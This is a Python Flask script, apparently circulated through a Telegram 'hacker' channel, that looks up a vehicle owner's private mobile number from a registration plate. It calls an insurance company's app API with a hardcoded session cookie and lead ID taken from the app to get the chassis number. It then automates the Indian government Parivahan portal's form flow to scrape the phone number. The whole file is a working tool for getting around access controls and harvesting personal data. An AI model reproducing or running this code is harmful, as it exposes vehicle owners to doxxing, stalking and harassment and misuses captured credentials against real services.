#!/usr/bin/env python3
"""
Vehicle Mobile Number API 2 (Single source: SMC Insurance)
RC → SMC (GetVaahanDetailsByVehicleNo, fully unauthenticated) → Parivahan (mobile) → Flask

  SMC Insurance (smcinsurance.com) — ONLY SOURCE
     → CallReqWithHeader / GetVaahanDetailsByVehicleNo (chassis + engine
       included, live from source). NO OTP, NO per-phone token, NO memory
       scan needed — just a static `leadid` + `Cookie` header pair captured
       from the app. This means the script is fully self-contained and can
       run from a VPS or any machine — no dependency on this phone at all.
       (If the static headers ever stop working, they'll need to be
       re-captured from a fresh app HAR.)

RUN:   python VNUMVHANINFO3_SMC.py
USE:   http://localhost:9000/?rc=GJ23CH0081&key=cyber_shr_1k
"""

import re, json, time
import requests
import urllib3
from bs4 import BeautifulSoup
from flask import Flask, jsonify, request

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════════════════════════
# RETRY CONFIG
# ═══════════════════════════════════════════════════════════════════
RETRY_ATTEMPTS = 1
RETRY_DELAY    = 1  # seconds between attempts

def with_retries(fn, *args, **kwargs):
    last = None
    for attempt in range(RETRY_ATTEMPTS):
        last = fn(*args, **kwargs)
        if last.get("success"):
            return last
        if attempt < RETRY_ATTEMPTS - 1:
            time.sleep(RETRY_DELAY)
    return last


# ═══════════════════════════════════════════════════════════════════
# CREDITS
# ═══════════════════════════════════════════════════════════════════
DEVELOPER = "@the_silent_hacker_raj"
OWNER     = "@cyber_shr_1k"
CHANNEL   = "https://t.me/cyber_shr_1k"


# ═══════════════════════════════════════════════════════════════════
# SOURCE 1: SMC INSURANCE (PRIMARY) — smcinsurance.com
# Fully unauthenticated — static leadid/Cookie headers, no phone/token
# dependency at all. No proxy handling (kept disabled per instruction).
# ═══════════════════════════════════════════════════════════════════

SMC_URL = "https://www.smcinsurance.com/central/centralcall/CallReqWithHeader"

SMC_HEADERS = {
    "User-Agent":   "okhttp/4.9.2",
    "Accept":       "application/json, text/plain, */*",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "leadid":       "SMC0F6D28AB52616178B0F5373223323",
    "x-device":     "M",
    "devicetype":   "MOBILE",
    "latitude":     "0",
    "longitude":    "0",
    "Cookie":       "MCBC=Y5D1nItK1fqcmqusqtZGpCJQShPiysLoJYLgQPC3GAY%3D%3Ac92bec22d63450531b96b5d844dc64b09a426eeafa90964a698b12fe6675188f",
}


def fetch_vehicle_from_smc(vehicle_number: str) -> dict:
    """
    RC → SMC Insurance se full vehicle details (chassis + engine included).
    Silent — koi print/log nahi.
    """
    rc = re.sub(r"[^A-Z0-9]", "", vehicle_number.upper())
    payload = {"url": "GetVaahanDetailsByVehicleNo", "props": [rc, "", "0"]}

    try:
        r = requests.post(SMC_URL, headers=SMC_HEADERS, data=json.dumps(payload), timeout=30)
        r.raise_for_status()
        result = r.json()
    except Exception as e:
        return {"success": False, "error": f"SMC exception: {e}"}

    if result.get("statusCode") != 200:
        return {"success": False, "error": result.get("message") or "SMC: RC lookup failed"}

    data = result.get("response") or {}
    if not data:
        return {"success": False, "error": "SMC: empty response"}

    chassis_raw = data.get("chassis", "")
    if not chassis_raw:
        return {"success": False, "error": "SMC: chassis not in response"}

    chassis_clean = re.sub(r"[^A-Z0-9]", "", chassis_raw.upper())
    if not chassis_clean:
        return {"success": False, "error": f"SMC: invalid chassis '{chassis_raw}'"}

    last_5 = chassis_clean[-5:] if len(chassis_clean) >= 5 else chassis_clean

    return {
        "success":        True,
        "full_chassis":   chassis_raw,
        "chassis_last_5": last_5,
        "vehicle_data":   data,
        "source":         "SMC",
    }


# ═══════════════════════════════════════════════════════════════════
# PARIVAHAN — chassis_last_5 → Mobile Number
# ═══════════════════════════════════════════════════════════════════

HOMEPAGE_URL  = "https://vahan.parivahan.gov.in/vahanservice/vahan/ui/statevalidation/homepage.xhtml?statecd=Mzc2MzM2MzAzNjY0MzIzODM3NjIzNjY0MzY2MjM3NDQ0Yw=="
HOMEPAGE_BASE = "https://vahan.parivahan.gov.in/vahanservice/vahan/ui/statevalidation/homepage.xhtml"
LOGIN_URL     = "https://vahan.parivahan.gov.in/vahanservice/vahan/ui/usermgmt/login.xhtml"
FORM_URL      = "https://vahan.parivahan.gov.in/vahanservice/vahan/ui/balanceservice/form_reschedule_fitness.xhtml"


def _extract_viewstate(html):
    soup = BeautifulSoup(html, "html.parser")
    vs   = soup.find("input", {"name": "javax.faces.ViewState"})
    return vs.get("value") if vs else None

def _extract_viewstate_ajax(text):
    m = re.search(r'<update id="j_id1:javax.faces.ViewState:0"><!\[CDATA\[(.*?)\]\]></update>', text)
    return m.group(1) if m else None

def _find_checkbox_id(html):
    m = re.search(r'id="(j_idt\d+)"[^>]*class="[^"]*ui-chkbox', html)
    return m.group(1) if m else "j_idt187"


def fetch_mobile_from_parivahan(vehicle_number: str, chassis_last_5: str) -> dict:
    session = requests.Session()
    session.verify = False

    BASE_H = {
        "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
        "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-GB,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
    }
    AJAX_H = {
        "User-Agent":      BASE_H["User-Agent"],
        "Accept":          "application/xml, text/xml, */*; q=0.01",
        "Content-Type":    "application/x-www-form-urlencoded; charset=UTF-8",
        "Faces-Request":   "partial/ajax",
        "X-Requested-With":"XMLHttpRequest",
        "Origin":          "https://vahan.parivahan.gov.in",
        "Accept-Language": "en-GB,en;q=0.9",
    }

    try:
        # 1. Homepage
        r1 = session.get(HOMEPAGE_URL, headers=BASE_H, timeout=25)
        vs = _extract_viewstate(r1.text)
        if not vs:
            return {"success": False, "error": "Parivahan: ViewState missing"}
        chk = _find_checkbox_id(r1.text)

        AJAX_H["Referer"] = HOMEPAGE_URL

        # 2. RTO select
        r2 = session.post(HOMEPAGE_BASE, headers=AJAX_H, timeout=25, data={
            "javax.faces.partial.ajax": "true", "javax.faces.source": "fit_c_office_to",
            "javax.faces.partial.execute": "fit_c_office_to",
            "javax.faces.behavior.event": "change", "javax.faces.partial.event": "change",
            "homepageformid": "homepageformid", "j_idt12": "", "j_idt47_input": "en",
            "state_cd_filter": "", "fit_c_office_to_input": "1", "abc": "abc",
            "javax.faces.ViewState": vs, "pmtchk_input": "-1", "nocregnno": "",
        })
        vs = _extract_viewstate_ajax(r2.text) or vs

        # 3. Checkbox
        r3 = session.post(HOMEPAGE_BASE, headers=AJAX_H, timeout=25, data={
            "javax.faces.partial.ajax": "true", "javax.faces.source": chk,
            "javax.faces.partial.execute": chk,
            "javax.faces.partial.render": "proccedHomeButtonId",
            "javax.faces.behavior.event": "change", "javax.faces.partial.event": "change",
            "homepageformid": "homepageformid", "j_idt12": "", "j_idt47_input": "en",
            "state_cd_filter": "", "fit_c_office_to_input": "1",
            f"{chk}_input": "on", "abc": "abc",
            "javax.faces.ViewState": vs, "pmtchk_input": "-1", "nocregnno": "",
        })
        vs = _extract_viewstate_ajax(r3.text) or vs

        # 4. Proceed
        r4 = session.post(HOMEPAGE_BASE, headers=AJAX_H, timeout=25, data={
            "javax.faces.partial.ajax": "true", "javax.faces.source": "proccedHomeButtonId",
            "javax.faces.partial.execute": "@all",
            "javax.faces.partial.render": "regnid facelesslist portaldownMsgPnl mainhomepagepnl leftmenupnlid leftmenupnlidservdown",
            "proccedHomeButtonId": "proccedHomeButtonId",
            "homepageformid": "homepageformid", "j_idt12": "", "j_idt47_input": "en",
            "state_cd_filter": "", "fit_c_office_to_input": "1",
            f"{chk}_input": "on", "abc": "abc",
            "javax.faces.ViewState": vs, "pmtchk_input": "-1", "nocregnno": "",
        })
        vs = _extract_viewstate_ajax(r4.text) or vs

        # 5. Dialog button
        m = re.search(r'id="(j_idt\d+)"[^>]*class="[^"]*ui-button', r4.text)
        dlg = m.group(1) if m else "j_idt536"
        r5 = session.post(HOMEPAGE_BASE, headers=AJAX_H, timeout=25, data={
            "javax.faces.partial.ajax": "true", "javax.faces.source": dlg,
            "javax.faces.partial.execute": "@all", f"{dlg}": dlg,
            "homepageformid": "homepageformid", "j_idt12": "", "j_idt47_input": "en",
            "state_cd_filter": "", "fit_c_office_to_input": "1",
            f"{chk}_input": "on", "pmtchk_input": "-1", "nocregnno": "",
            "javax.faces.ViewState": vs,
        })
        vs = _extract_viewstate_ajax(r5.text) or vs

        # 6. Login page
        lh = BASE_H.copy(); lh["Referer"] = HOMEPAGE_URL
        r6 = session.get(LOGIN_URL + "?faces-redirect=true", headers=lh, timeout=25, allow_redirects=True)
        vs = _extract_viewstate(r6.text)
        if not vs:
            return {"success": False, "error": "Parivahan: login ViewState missing"}

        # 7. fitbalcTest
        m = re.search(r'id="(j_idt\d+)"[^>]*name="\1"[^>]*type="submit"', r6.text)
        fitbtn = m.group(1) if m else "j_idt506"
        ph = BASE_H.copy()
        ph["Content-Type"] = "application/x-www-form-urlencoded"
        ph["Origin"]   = "https://vahan.parivahan.gov.in"
        ph["Referer"]  = LOGIN_URL + "?faces-redirect=true"
        session.post(LOGIN_URL, headers=ph, timeout=25, allow_redirects=True, data={
            "loginForm": "loginForm", f"{fitbtn}": fitbtn,
            "javax.faces.ViewState": vs,
            "InputEnter": "", "fitbalcTest": "fitbalcTest", "pur_cd": "86",
        })

        # 8. Form page
        fh = BASE_H.copy(); fh["Referer"] = LOGIN_URL + "?faces-redirect=true"
        r8 = session.get(FORM_URL, headers=fh, timeout=25)
        vs = _extract_viewstate(r8.text)
        if not vs:
            return {"success": False, "error": "Parivahan: form ViewState missing"}

        # 9. Submit RC + chassis
        AJAX_H["Referer"] = FORM_URL
        r9 = session.post(FORM_URL, headers=AJAX_H, timeout=25, data={
            "javax.faces.partial.ajax": "true",
            "javax.faces.source": "balanceFeesFine:validate_dtls",
            "javax.faces.partial.execute": "@all",
            "javax.faces.partial.render": "balanceFeesFine:auth_panel",
            "balanceFeesFine:validate_dtls": "balanceFeesFine:validate_dtls",
            "balanceFeesFine": "balanceFeesFine",
            "balanceFeesFine:tf_reg_no":    vehicle_number,
            "balanceFeesFine:tf_chasis_no": chassis_last_5,
            "javax.faces.ViewState": vs,
        })

        # 10. Extract mobile
        for pat in [
            r'id="balanceFeesFine:tf_mobile"[^>]*value="(\d{10})"',
            r'value="(\d{10})"[^>]*id="balanceFeesFine:tf_mobile"',
        ]:
            m = re.search(pat, r9.text, re.DOTALL)
            if m and m.group(1)[0] in "6789":
                return {"success": True, "mobile_number": m.group(1)}

        fallback = re.findall(r'\b([6-9]\d{9})\b', r9.text)
        if fallback:
            return {"success": True, "mobile_number": fallback[0]}

        return {"success": False, "error": "Parivahan: mobile not found"}

    except Exception as e:
        return {"success": False, "error": f"Parivahan exception: {e}"}
    finally:
        session.close()


# ═══════════════════════════════════════════════════════════════════
# CORE LOGIC — SMC chassis fetch → Parivahan mobile
# ═══════════════════════════════════════════════════════════════════

def get_mobile_for_vehicle(raw_vn: str) -> dict:
    vn = re.sub(r"[^A-Z0-9]", "", raw_vn.upper())
    if len(vn) < 6:
        return {"success": False, "error": "Invalid RC number"}

    # Step 1: Get chassis from SMC (fully unauthenticated)
    vehicle_res = with_retries(fetch_vehicle_from_smc, vn)
    if not vehicle_res["success"]:
        return {"success": False, "error": vehicle_res["error"]}

    # Step 2: Get mobile from Parivahan (retried on failure)
    mobile_res = with_retries(fetch_mobile_from_parivahan, vn, vehicle_res["chassis_last_5"])
    if not mobile_res["success"]:
        return {"success": False, "error": mobile_res["error"]}

    mobile = mobile_res["mobile_number"]

    return {
        "success":        True,
        "mobile_number":  mobile,
        "chassis_last_5": vehicle_res["chassis_last_5"],
        "vehicle_data":   vehicle_res["vehicle_data"],
        "source":         vehicle_res["source"] + "+parivahan",
    }


# ═══════════════════════════════════════════════════════════════════
# API KEY
# ═══════════════════════════════════════════════════════════════════
API_KEY = "cyber_shr_1k"    # usage: /?rc=GJ23CH0081&key=cyber_shr_1k

# ═══════════════════════════════════════════════════════════════════
# FLASK API
# ═══════════════════════════════════════════════════════════════════

app = Flask(__name__)

@app.route("/")
def api_get_mobile():
    key = request.args.get("key", "").strip()
    if not key:
        return jsonify({"error": "Missing 'key' parameter", "status": "failed"}), 401
    if key != API_KEY:
        return jsonify({"error": "Invalid API key", "status": "failed"}), 403

    rc = request.args.get("rc", "").strip()
    if not rc:
        return jsonify({"error": "Missing 'rc' parameter", "status": "failed"}), 400

    result = get_mobile_for_vehicle(rc)

    if result["success"]:
        return jsonify({
            "status":         "success",
            "vehicle_number": re.sub(r"[^A-Z0-9]", "", rc.upper()),
            "mobile_number":  result["mobile_number"],
            "developer":      DEVELOPER,
            "owner":          OWNER,
            "channel":        CHANNEL,
        })

    # DISTINGUISH: temporary fail vs no data
    err = result.get("error", "").lower()
    if any(x in err for x in ["exception", "timeout", "viewstate", "login", "failed"]):
        return jsonify({
            "status":         "temp_fail",
            "vehicle_number": rc.upper(),
            "error":          result["error"],
            "developer":      DEVELOPER,
            "owner":          OWNER,
            "channel":        CHANNEL,
        }), 503
    else:
        return jsonify({
            "status":         "not_found",
            "vehicle_number": rc.upper(),
            "mobile_number":  None,
            "developer":      DEVELOPER,
            "owner":          OWNER,
            "channel":        CHANNEL,
        }), 404

@app.route("/smc")
def api_get_smc_raw():
    key = request.args.get("key", "").strip()
    if not key:
        return jsonify({"error": "Missing 'key' parameter", "status": "failed"}), 401
    if key != API_KEY:
        return jsonify({"error": "Invalid API key", "status": "failed"}), 403

    rc = request.args.get("rc", "").strip()
    if not rc:
        return jsonify({"error": "Missing 'rc' parameter", "status": "failed"}), 400

    result = get_mobile_for_vehicle(rc)

    if result["success"]:
        data = result.get("vehicle_data", {})
        data["owner_number"] = result["mobile_number"]
        return jsonify({
            "status":         "success",
            "vehicle_number": re.sub(r"[^A-Z0-9]", "", rc.upper()),
            "data":           data,
            "developer":      DEVELOPER,
            "owner":          OWNER,
            "channel":        CHANNEL,
        })

    err = result.get("error", "").lower()
    if any(x in err for x in ["exception", "timeout", "viewstate", "login", "failed"]):
        return jsonify({
            "status":         "temp_fail",
            "vehicle_number": rc.upper(),
            "error":          result["error"],
            "developer":      DEVELOPER,
            "owner":          OWNER,
            "channel":        CHANNEL,
        }), 503
    else:
        return jsonify({
            "status":         "not_found",
            "vehicle_number": rc.upper(),
            "data":           None,
            "developer":      DEVELOPER,
            "owner":          OWNER,
            "channel":        CHANNEL,
        }), 404


if __name__ == "__main__":
    print("\n  Vehicle Mobile API 2 (SMC only)")
    print("  ─────────────────────────────────────────")
    print("  Mobile:  http://localhost:9000/?rc=GJ23CH0081&key=" + API_KEY)
    print("  Chain:   SMC (unauthenticated) → Parivahan")
    print("  NOTE:    fully VPS-compatible — no phone/token dependency")
    print("  ─────────────────────────────────────────")
    print("  Developer: " + DEVELOPER)
    print("  Owner:     " + OWNER)
    print("  Channel:   " + CHANNEL)
    print("  ─────────────────────────────────────────\n")
    app.run(host="0.0.0.0", port=9000, debug=False, threaded=True)